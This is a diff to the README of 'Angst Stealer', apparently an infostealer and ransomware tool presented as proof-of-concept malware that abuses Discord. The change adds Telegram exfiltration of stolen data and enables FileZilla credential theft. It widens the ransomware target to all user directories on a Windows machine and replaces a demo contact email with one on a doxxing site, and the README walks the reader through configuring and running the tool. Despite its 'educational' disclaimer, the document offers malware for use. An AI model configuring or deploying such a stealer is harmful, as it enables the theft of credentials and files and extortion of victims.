@@ -1,5 +1,5 @@
 ## Angst Stealer
-AngstStealer is a PoC malware which is designed to highlight and utilize Discord as an attack vector. While it is fully functioning it was created for educational purpose's, please do not use misuse this tool. Angst Stealer currently has a total of 9 plugins:
+AngstStealer is a PoC malware which is designed to highlight and utilize Discord as an attack vector. While it is fully functioning it was created for educational purpose's, please do not use misuse this tool. Angst Stealer currently has a total of 10 plugins:
 
 |Plugin |Description |
 |------ |----------- |
@@ -20,19 +20,23 @@ AngstStealer is a PoC malware which is designed to highlight and utilize Discord
 3. Run `cd folderpath` so that you are inside the directory itself.
 4. Install the required libraries using `pip install -r requirements.txt`
 5. Inside the main file you will see a config template, modify it so it matches your requirements.
-```
+```json
 CONFIG = {
     "webhook" : "",
     "chrome" : True,
-    "filezilla":False,
+    "filezilla":True,
     "userdata":True,
     "discord":True,
+    "send_discord": False,
+    "send_telegram": True,
+    "telegram_token": "",
+    "telegram_chat_id": "",
     "ransomware" : {
         "enabled" : False,
-        "target_dir" : "C:\\Users\\testuser", #remove the testuser at the end
+        "target_dir" : "C:\\Users\\", 
         "extenstion" : ".angst",
         "btcAddy" : "",
-        "email" : "demo.tmpacc12@gmail.com"
+        "email" : "charge@d0xbin.org"
     }
 }
 ```
